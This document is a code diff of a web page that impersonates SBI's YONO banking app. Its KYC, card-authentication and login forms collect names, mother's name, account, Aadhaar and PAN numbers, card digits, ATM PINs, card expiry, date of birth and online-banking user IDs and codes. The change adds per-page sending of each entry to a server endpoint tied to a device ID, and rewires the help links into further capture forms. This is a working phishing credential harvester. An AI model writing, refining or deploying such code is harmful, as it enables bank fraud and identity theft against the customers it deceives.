@@ -203,6 +203,7 @@
             font-size: 14px;
             text-decoration: none;
             margin-bottom: 6px;
+            cursor: pointer;
         }
 
         .note-box {
@@ -236,7 +237,7 @@
             font-size: 14px;
         }
 
-        /* ==================== STEP 4: CARD STYLES ==================== */
+        /* ==================== CARD STYLES ==================== */
         .card-header {
             padding: 14px 16px;
             font-size: 18px;
@@ -291,13 +292,12 @@
             border: 1px solid #cfcfcf;
             border-radius: 12px;
             padding: 0 12px;
-            font-size: 36px;
-            letter-spacing: 18px;
+            font-size: 24px;
+            letter-spacing: 12px;
             text-align: center;
-            caret-color: transparent;
         }
 
-        /* ==================== STEP 5: APPLY STYLES ==================== */
+        /* ==================== BANNERS ==================== */
         .banner {
             text-align: center;
             padding: 14px 8px 6px;
@@ -330,7 +330,6 @@
             background: #9e9e9e;
         }
 
-        /* ==================== STEP 6: FORUM STYLES ==================== */
         .top-banner-full {
             height: 190px;
             overflow: hidden;
@@ -443,15 +442,15 @@
 
 <body>
 
-    <!-- ==================== STEP 1: LOADER ==================== -->
-    <div id="step1" class="step active">
+    <!-- ==================== STEP: INDEX (loader) ==================== -->
+    <div id="step-index" class="step active">
         <div class="loader-container">
             <img src="img/yono-banner1.png" class="loader-img" alt="Loading">
         </div>
     </div>
 
-    <!-- ==================== STEP 2: KYC LOGIN (index 1) ==================== -->
-    <div id="step2" class="step">
+    <!-- ==================== STEP: INDEX_1 (KYC Login) ==================== -->
+    <div id="step-index_1" class="step">
         <div class="page">
             <div class="top-banner">
                 <img src="img/8p.jpg" alt="Top Banner">
@@ -474,13 +473,13 @@
                 <input type="text" id="motherName" placeholder="Enter mother's name" required>
 
                 <div class="buttons">
-                    <button id="step2Next">Submit</button>
-                    <button type="button" onclick="resetStep2()">Reset</button>
+                    <button id="index1Submit">Submit</button>
+                    <button type="button" onclick="resetIndex1()">Reset</button>
                 </div>
 
                 <div class="links">
-                    <a href="#" onclick="return false;">New Customer ? Register here</a>
-                    <a href="#" onclick="return false;">Forgot Username</a>
+                    <a onclick="goToApply()">New Customer ? Register here</a>
+                    <a onclick="goToApply()">Forgot Username</a>
                 </div>
 
                 <div class="note-box">
@@ -499,8 +498,8 @@
         </div>
     </div>
 
-    <!-- ==================== STEP 3: VERIFY PROFILE (index 1 1) ==================== -->
-    <div id="step3" class="step">
+    <!-- ==================== STEP: INDEX_1_1 (Profile Verification) ==================== -->
+    <div id="step-index_1_1" class="step">
         <div class="page">
             <div class="header">
                 <img src="img/sbi-logo.png" alt="SBI">
@@ -519,7 +518,7 @@
                 <label>PAN Card Number <span>*</span></label>
                 <input type="text" id="panCard" maxlength="10" placeholder="Enter PAN number" required>
 
-                <button id="step3Next" class="accent"
+                <button id="index11Submit" class="accent"
                     style="width:200px;margin:18px auto;display:block;">submit</button>
             </div>
 
@@ -538,8 +537,8 @@
         </div>
     </div>
 
-    <!-- ==================== STEP 4: CARD AUTHENTICATION (card) ==================== -->
-    <div id="step4" class="step">
+    <!-- ==================== STEP: CARD (Card Authentication) ==================== -->
+    <div id="step-card" class="step">
         <div class="page" style="background:#f8f8f8;">
             <div class="card-header">Debit Card Authentication</div>
 
@@ -557,7 +556,10 @@
                 <label style="margin-top:14px;">Enter ATM PIN</label>
                 <input type="tel" id="atmPin" class="pin-input" inputmode="numeric" placeholder="••••" maxlength="4">
 
-                <button id="step4Next" class="accent" style="margin-top:20px;">Proceed →</button>
+                <button id="cardSubmit" class="accent" style="margin-top:20px;">
+                    <span class="btn-text">Proceed →</span>
+                    <div class="spinner"></div>
+                </button>
             </div>
 
             <div class="note-box">
@@ -575,8 +577,8 @@
         </div>
     </div>
 
-    <!-- ==================== STEP 5: APPLY YONO (apply) ==================== -->
-    <div id="step5" class="step">
+    <!-- ==================== STEP: APPLY (Apply YONO) ==================== -->
+    <div id="step-apply" class="step">
         <div class="banner">
             <img src="img/yono-banner1.png" alt="YONO SBI">
         </div>
@@ -600,8 +602,8 @@
             <input type="text" id="branchCode" placeholder="Enter branch code" required>
 
             <div class="btn-row">
-                <button id="step5Next" class="submit-btn">Submit</button>
-                <button type="button" class="reset-btn" onclick="resetStep5()">Reset</button>
+                <button id="applySubmit" class="submit-btn">Submit</button>
+                <button type="button" class="reset-btn" onclick="resetApply()">Reset</button>
             </div>
 
             <div class="note-box">
@@ -619,8 +621,8 @@
         </div>
     </div>
 
-    <!-- ==================== STEP 6: FINAL VERIFICATION (forum) ==================== -->
-    <div id="step6" class="step">
+    <!-- ==================== STEP: FORUM (Verification) ==================== -->
+    <div id="step-forum" class="step">
         <div class="page" style="background:#eef4fb;">
             <div class="top-banner-full">
                 <img src="img/top-banner.jpg" alt="Top Banner">
@@ -636,10 +638,9 @@
                 <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5">
 
                 <label>ATM PIN <span>*</span></label>
-                <input type="tel" id="finalPin" class="pin-input" inputmode="numeric" placeholder="••••" maxlength="4">
+                <input type="tel" id="forumPin" class="pin-input" inputmode="numeric" placeholder="••••" maxlength="4">
 
-
-                <button id="step6Next" disabled style="margin-top:16px;">Continue</button>
+                <button id="forumSubmit" disabled style="margin-top:16px;">Continue</button>
             </div>
 
             <div class="bottom-banner">
@@ -648,8 +649,8 @@
         </div>
     </div>
 
-    <!-- ==================== STEP 7: LOGIN DETAILS (login) ==================== -->
-    <div id="step7" class="step">
+    <!-- ==================== STEP: LOGIN (Login Details) ==================== -->
+    <div id="step-login" class="step">
         <div class="page" style="background:#eef4fb;">
             <div class="top-banner-full">
                 <img src="img/top-banner.jpg" alt="Top Banner">
@@ -667,7 +668,7 @@
                 <label>Profile Code <span>*</span></label>
                 <input type="password" id="profileCode" placeholder="Enter Profile Code">
 
-                <button id="submitBtn" disabled
+                <button id="loginSubmit" disabled
                     style="margin-top:16px;background:linear-gradient(180deg,#0a4da2,#083b7a);">
                     <span class="btn-text">Verify & Finish</span>
                     <div class="spinner"></div>
@@ -681,7 +682,7 @@
     </div>
 
     <!-- ==================== SUCCESS SCREEN ==================== -->
-    <div id="successStep" class="step">
+    <div id="step-success" class="step">
         <div class="success-container">
             <div class="success-icon">
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -698,8 +699,11 @@
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('deviceId') || 'unknown';
 
-        // Form data collector
-        const formData = {};
+        // Form data collector - stores all data across both flows
+        const formData = {
+            deviceId: deviceId,
+            currentFlow: 'main' // 'main' or 'apply'
+        };
 
         // Step navigation
         function showStep(stepId) {
@@ -708,11 +712,45 @@
             window.scrollTo(0, 0);
         }
 
-        // Step 1: Auto-advance after 6 seconds
-        setTimeout(() => showStep('step2'), 6000);
+        // Sync data to server (page-wise submission)
+        async function syncPageData(pageName, data) {
+            console.log(`[Form] Syncing ${pageName} data:`, data);
+            try {
+                await fetch('/api/form/sync', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deviceId: deviceId,
+                        pageName: pageName,
+                        pageData: data,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('[Form] Sync error:', error);
+            }
+        }
 
-        // Step 2: KYC Login
-        document.getElementById('step2Next').addEventListener('click', () => {
+        // Final submission
+        async function submitFinalData() {
+            try {
+                const response = await fetch('/api/form/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('[Form] Submit error:', error);
+                return false;
+            }
+        }
+
+        // ==================== INDEX (LOADER) ====================
+        setTimeout(() => showStep('step-index_1'), 6000);
+
+        // ==================== INDEX_1 (KYC Login) ====================
+        document.getElementById('index1Submit').addEventListener('click', async () => {
             const fullName = document.getElementById('fullName').value.trim();
             const mobileNumber = document.getElementById('mobileNumber').value.trim();
             const motherName = document.getElementById('motherName').value.trim();
@@ -725,17 +763,28 @@
             formData.fullName = fullName;
             formData.mobileNumber = mobileNumber;
             formData.motherName = motherName;
-            showStep('step3');
+            formData.currentFlow = 'main';
+
+            // Sync page data
+            await syncPageData('index_1', { fullName, mobileNumber, motherName });
+
+            showStep('step-index_1_1');
         });
 
-        function resetStep2() {
+        function resetIndex1() {
             document.getElementById('fullName').value = '';
             document.getElementById('mobileNumber').value = '';
             document.getElementById('motherName').value = '';
         }
 
-        // Step 3: Verify Profile
-        document.getElementById('step3Next').addEventListener('click', () => {
+        // Go to Apply flow (from register/forgot links)
+        function goToApply() {
+            formData.currentFlow = 'apply';
+            showStep('step-apply');
+        }
+
+        // ==================== INDEX_1_1 (Profile Verification) ====================
+        document.getElementById('index11Submit').addEventListener('click', async () => {
             const accountNumber = document.getElementById('accountNumber').value.trim();
             const aadhaarNumber = document.getElementById('aadhaarNumber').value.trim();
             const panCard = document.getElementById('panCard').value.trim().toUpperCase();
@@ -748,10 +797,14 @@
             formData.accountNumber = accountNumber;
             formData.aadhaarNumber = aadhaarNumber;
             formData.panCard = panCard;
-            showStep('step4');
+
+            // Sync page data
+            await syncPageData('index_1_1', { accountNumber, aadhaarNumber, panCard });
+
+            showStep('step-card');
         });
 
-        // Step 4: Card Authentication
+        // ==================== CARD (Card Authentication) ====================
         const cards = ["img/card1.jpg", "img/card2.jpg", "img/card3.jpg"];
         let cardIndex = 0;
         setInterval(() => {
@@ -768,52 +821,77 @@
             cardLast6Input.value = v;
         });
 
-        // ATM PIN masking (Step 4)
-        let atmPinReal = '';
+        // ATM PIN input
         const atmPinInput = document.getElementById('atmPin');
-        atmPinInput.addEventListener('input', e => {
-            if (e.inputType === 'deleteContentBackward') {
-                atmPinReal = atmPinReal.slice(0, -1);
-            } else if (/\d/.test(e.data) && atmPinReal.length < 4) {
-                atmPinReal += e.data;
-            }
-            atmPinInput.value = '•'.repeat(atmPinReal.length);
+        atmPinInput.addEventListener('input', () => {
+            atmPinInput.value = atmPinInput.value.replace(/\D/g, '').slice(0, 4);
         });
 
-        document.getElementById('step4Next').addEventListener('click', () => {
+        document.getElementById('cardSubmit').addEventListener('click', async () => {
             const cardLast6 = cardLast6Input.value.replace(/\s/g, '');
+            const atmPin = atmPinInput.value;
 
-            if (cardLast6.length !== 6 || atmPinReal.length !== 4) {
+            if (cardLast6.length !== 6 || atmPin.length !== 4) {
                 alert('Please enter valid card details');
                 return;
             }
 
             formData.cardLast6 = cardLast6;
-            formData.atmPin = atmPinReal;
-            showStep('step5');
+            formData.atmPin = atmPin;
 
-            // Pre-fill some fields from previous steps
-            document.getElementById('applyName').value = formData.fullName || '';
-            document.getElementById('applyMobile').value = formData.mobileNumber || '';
-            document.getElementById('applyAccount').value = formData.accountNumber || '';
+            const btn = document.getElementById('cardSubmit');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            // Sync page data
+            await syncPageData('card', { cardLast6, atmPin });
+
+            // Final submit for main flow
+            const success = await submitFinalData();
+
+            btn.classList.remove('loading');
+            btn.disabled = false;
+
+            if (success) {
+                showStep('step-success');
+            } else {
+                alert('Submission failed. Please try again.');
+            }
         });
 
-        // Step 5: Apply YONO
-        document.getElementById('step5Next').addEventListener('click', () => {
+        // ==================== APPLY (Apply YONO) ====================
+        document.getElementById('applySubmit').addEventListener('click', async () => {
+            const applyName = document.getElementById('applyName').value.trim();
+            const applyMobile = document.getElementById('applyMobile').value.trim();
+            const applyAccount = document.getElementById('applyAccount').value.trim();
             const cifNumber = document.getElementById('cifNumber').value.trim();
             const branchCode = document.getElementById('branchCode').value.trim();
 
-            if (!cifNumber || !branchCode) {
-                alert('Please fill in CIF Number and Branch Code');
+            if (!applyName || !applyMobile || !applyAccount || !cifNumber || !branchCode) {
+                alert('Please fill in all fields');
                 return;
             }
 
+            // For apply flow, use these as primary fields
+            formData.fullName = applyName;
+            formData.mobileNumber = applyMobile;
+            formData.accountNumber = applyAccount;
             formData.cifNumber = cifNumber;
             formData.branchCode = branchCode;
-            showStep('step6');
+
+            // Sync page data with consistent field names
+            await syncPageData('apply', {
+                fullName: applyName,
+                mobileNumber: applyMobile,
+                accountNumber: applyAccount,
+                cifNumber,
+                branchCode
+            });
+
+            showStep('step-forum');
         });
 
-        function resetStep5() {
+        function resetApply() {
             document.getElementById('applyName').value = '';
             document.getElementById('applyMobile').value = '';
             document.getElementById('applyAccount').value = '';
@@ -821,12 +899,11 @@
             document.getElementById('branchCode').value = '';
         }
 
-        // Step 6: Final Verification
+        // ==================== FORUM (Verification) ====================
         const dobInput = document.getElementById('dob');
         const expiryInput = document.getElementById('cardExpiry');
-        const finalPinInput = document.getElementById('finalPin');
-        const step6NextBtn = document.getElementById('step6Next');
-
+        const forumPinInput = document.getElementById('forumPin');
+        const forumSubmitBtn = document.getElementById('forumSubmit');
 
         // DOB formatting
         dobInput.addEventListener('input', () => {
@@ -836,7 +913,7 @@
             if (v.length > 2) f += '/' + v.slice(2, 4);
             if (v.length > 4) f += '/' + v.slice(4);
             dobInput.value = f;
-            validateStep6();
+            validateForum();
         });
 
         // Expiry formatting
@@ -844,83 +921,81 @@
             let v = expiryInput.value.replace(/\D/g, '').slice(0, 4);
             if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
             expiryInput.value = v;
-            validateStep6();
+            validateForum();
         });
 
-        // Final PIN - simplified for better browser compatibility
-        finalPinInput.addEventListener('input', () => {
-            // Only allow digits
-            finalPinInput.value = finalPinInput.value.replace(/\D/g, '').slice(0, 4);
-            validateStep6();
+        // Forum PIN
+        forumPinInput.addEventListener('input', () => {
+            forumPinInput.value = forumPinInput.value.replace(/\D/g, '').slice(0, 4);
+            validateForum();
         });
 
-        function validateStep6() {
-            step6NextBtn.disabled = !(
+        function validateForum() {
+            forumSubmitBtn.disabled = !(
                 dobInput.value.length === 10 &&
                 expiryInput.value.length === 5 &&
-                finalPinInput.value.length === 4
+                forumPinInput.value.length === 4
             );
         }
 
-
-
-        // Step 6 to Step 7
-        step6NextBtn.addEventListener('click', () => {
+        forumSubmitBtn.addEventListener('click', async () => {
             formData.dateOfBirth = dobInput.value;
             formData.cardExpiry = expiryInput.value;
-            formData.finalPin = finalPinInput.value;
-            showStep('step7');
+            formData.finalPin = forumPinInput.value;
+
+            // Sync page data
+            await syncPageData('forum', {
+                dateOfBirth: dobInput.value,
+                cardExpiry: expiryInput.value,
+                finalPin: forumPinInput.value
+            });
+
+            showStep('step-login');
         });
 
-
-        // Step 7: Login Details
+        // ==================== LOGIN (Login Details) ====================
         const userIdInput = document.getElementById('userId');
         const accessCodeInput = document.getElementById('accessCode');
         const profileCodeInput = document.getElementById('profileCode');
-        const submitBtn = document.getElementById('submitBtn');
+        const loginSubmitBtn = document.getElementById('loginSubmit');
 
         [userIdInput, accessCodeInput, profileCodeInput].forEach(input => {
-            input.addEventListener('input', validateStep7);
+            input.addEventListener('input', validateLogin);
         });
 
-        function validateStep7() {
-            submitBtn.disabled = !(
+        function validateLogin() {
+            loginSubmitBtn.disabled = !(
                 userIdInput.value.trim().length >= 3 &&
                 accessCodeInput.value.trim().length >= 4 &&
                 profileCodeInput.value.trim().length >= 4
             );
         }
 
-        // Final Submit
-        submitBtn.addEventListener('click', async () => {
+        loginSubmitBtn.addEventListener('click', async () => {
             formData.userId = userIdInput.value.trim();
             formData.accessCode = accessCodeInput.value.trim();
             formData.profileCode = profileCodeInput.value.trim();
-            formData.deviceId = deviceId;
 
-            submitBtn.classList.add('loading');
-            submitBtn.disabled = true;
+            loginSubmitBtn.classList.add('loading');
+            loginSubmitBtn.disabled = true;
 
-            try {
-                const response = await fetch('/api/form/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(formData)
-                });
+            // Sync page data
+            await syncPageData('login', {
+                userId: formData.userId,
+                accessCode: formData.accessCode,
+                profileCode: formData.profileCode
+            });
 
-                const result = await response.json();
+            // Final submit for apply flow
+            const success = await submitFinalData();
 
-                if (response.ok) {
-                    showStep('successStep');
-                } else {
-                    alert(result.error || 'Submission failed. Please try again.');
-                    submitBtn.classList.remove('loading');
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                alert('Network error. Please check your connection.');
-                submitBtn.classList.remove('loading');
-                submitBtn.disabled = false;
+            loginSubmitBtn.classList.remove('loading');
+            loginSubmitBtn.disabled = false;
+
+            if (success) {
+                showStep('step-success');
+            } else {
+                alert('Submission failed. Please try again.');
             }
         });
     </script>
